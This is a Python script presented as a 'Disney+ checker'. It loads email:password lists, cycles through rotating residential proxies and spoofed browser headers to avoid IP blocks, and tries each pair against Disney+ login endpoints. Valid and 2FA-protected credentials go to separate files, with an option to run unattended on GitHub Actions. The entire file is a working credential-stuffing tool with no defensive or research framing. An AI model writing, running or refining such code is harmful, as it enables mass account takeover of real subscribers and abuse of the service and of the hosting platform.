"""
DISNEY+ CHECKER - WITH PROXY SUPPORT FOR GITHUB ACTIONS
Uses your rotating residential proxy
"""

import requests
import time
import os
import json
import random
from datetime import datetime

class DisneyProxyChecker:
    def __init__(self):
        self.accounts_file = "my_disney_accounts.txt"
        self.proxies_file = "proxies.txt"
        self.working_file = "WORKING_ACCOUNTS.txt"
        self.invalid_file = "INVALID_ACCOUNTS.txt"
        self.twofa_file = "TWOFA_ACCOUNTS.txt"
        self.accounts = []
        self.proxies = []
        self.working = []
        self.invalid = []
        self.twofa_accounts = []
        self.proxy_index = 0
        
    def load_proxies(self):
        """Load proxies from proxies.txt"""
        if not os.path.exists(self.proxies_file):
            print(f"⚠️ {self.proxies_file} not found! Running without proxies...")
            return False
        
        with open(self.proxies_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith('http'):
                        line = f'http://{line}'
                    self.proxies.append(line)
        
        print(f"✅ Loaded {len(self.proxies)} proxies")
        return len(self.proxies) > 0
    
    def get_next_proxy(self):
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return proxy
    
    def load_accounts(self):
        """Load accounts from file"""
        if not os.path.exists(self.accounts_file):
            print(f"❌ {self.accounts_file} not found!")
            return False
        
        with open(self.accounts_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    email, password = line.split(':', 1)
                    self.accounts.append({
                        'email': email.strip(),
                        'password': password.strip()
                    })
        
        print(f"✅ Loaded {len(self.accounts)} accounts")
        return True
    
    def check_account(self, account, proxy=None):
        """Check account using Disney's API with proxy"""
        email = account['email']
        password = account['password']
        
        print(f"\n🔍 Testing: {email[:35]}...")
        
        # Configure proxy
        proxies = None
        if proxy:
            proxies = {'http': proxy, 'https': proxy}
            print(f"   🌐 Using proxy: {proxy[:40]}...")
        
        session = requests.Session()
        
        # Real browser headers
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Origin": "https://www.disneyplus.com",
            "Referer": "https://www.disneyplus.com/",
        })
        
        if proxies:
            session.proxies.update(proxies)
        
        try:
            # Step 1: Check if email exists
            email_response = session.post(
                "https://www.disneyplus.com/identity/api/login",
                json={"email": email},
                timeout=30
            )
            
            if email_response.status_code == 404:
                print(f"   ❌ API endpoint not found - Disney may have changed their API")
                return False
            elif email_response.status_code == 403:
                print(f"   ❌ Access denied - IP may be blocked")
                return False
            elif email_response.status_code != 200:
                print(f"   ❌ Email check failed (HTTP {email_response.status_code})")
                return False
            
            email_data = email_response.json()
            
            if not email_data.get('is_identified'):
                print(f"   ❌ Email not registered with Disney+")
                return False
            
            # Step 2: Check password
            login_response = session.post(
                "https://www.disneyplus.com/identity/api/login/password",
                json={
                    "email": email,
                    "password": password,
                    "rememberMe": False
                },
                timeout=30
            )
            
            if login_response.status_code == 200:
                login_data = login_response.json()
                
                if login_data.get('accessToken'):
                    print(f"   ✅✅✅ WORKING! ✅✅✅")
                    return True
                elif 'error' in login_data:
                    error_msg = login_data.get('error_description', 'Unknown')
                    if '2fa' in error_msg.lower() or 'verification' in error_msg.lower():
                        print(f"   🔐 2FA REQUIRED")
                        return '2fa'
                    else:
                        print(f"   ❌ Wrong password")
                        return False
                else:
                    print(f"   ❌ Login failed")
                    return False
            elif login_response.status_code == 403:
                print(f"   🔐 2FA REQUIRED")
                return '2fa'
            else:
                print(f"   ❌ Password check failed (HTTP {login_response.status_code})")
                return False
                
        except requests.exceptions.Timeout:
            print(f"   ⚠️ Timeout - proxy may be slow")
            return False
        except requests.exceptions.ProxyError:
            print(f"   ❌ Proxy error - skipping")
            return False
        except Exception as e:
            print(f"   ❌ Error: {str(e)[:60]}")
            return False
    
    def check_all(self):
        """Check all accounts with proxy rotation"""
        total = len(self.accounts)
        has_proxies = self.load_proxies()
        
        if not has_proxies:
            print("\n⚠️ No proxies found! Add proxies to proxies.txt")
            print("   Format: http://user:pass@host:port")
            return
        
        print(f"\n📊 Starting check of {total} accounts")
        print(f"🔄 Using {len(self.proxies)} rotating proxies")
        
        for i, account in enumerate(self.accounts, 1):
            print(f"\n{'='*50}")
            print(f"[{i}/{total}]")
            print(f"{'='*50}")
            
            # Rotate proxy for each account
            proxy = self.get_next_proxy()
            result = self.check_account(account, proxy)
            
            if result == True:
                self.working.append(account)
                with open(self.working_file, 'a') as f:
                    f.write(f"{account['email']}:{account['password']}\n")
                print(f"   💾 Saved to working accounts")
            elif result == '2fa':
                self.twofa_accounts.append(account)
                with open(self.twofa_file, 'a') as f:
                    f.write(f"{account['email']}:{account['password']}\n")
            else:
                self.invalid.append(account)
            
            # Progress update
            if i % 50 == 0:
                print(f"\n📊 PROGRESS: {i}/{total}")
                print(f"   ✅ Working: {len(self.working)}")
                print(f"   ❌ Invalid: {len(self.invalid)}")
                print(f"   🔐 2FA: {len(self.twofa_accounts)}")
            
            # Delay between requests
            delay = random.uniform(5, 10)
            time.sleep(delay)
        
        # Final summary
        print(f"\n{'='*50}")
        print("✅ CHECKING COMPLETE!")
        print(f"{'='*50}")
        print(f"✅ Working: {len(self.working)}")
        print(f"❌ Invalid: {len(self.invalid)}")
        print(f"🔐 2FA: {len(self.twofa_accounts)}")

def main():
    checker = DisneyProxyChecker()
    
    print("="*50)
    print("🎬 DISNEY+ PROXY CHECKER")
    print("="*50)
    
    if not checker.load_accounts():
        print("\n📝 Create my_disney_accounts.txt with:")
        print("   email:password")
        return
    
    # Auto-start on GitHub Actions
    is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
    
    if is_github:
        print("🕶️ Running on GitHub Actions")
        checker.check_all()
    else:
        confirm = input("\n▶️ Start? (yes/no): ")
        if confirm.lower() == 'yes':
            checker.check_all()

if __name__ == "__main__":
    main()
